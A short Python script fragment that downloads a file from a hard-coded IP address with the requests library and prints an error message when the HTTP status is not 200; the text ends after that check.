import os
import requests
import hashlib

server_url = f"http://18.140.235.142:3000/"

def main():
    # Download the file from the server
    response = requests.get(server_url)
    if response.status_code != 200:
        print(f"Failed to download file from server: {response.status_code}")
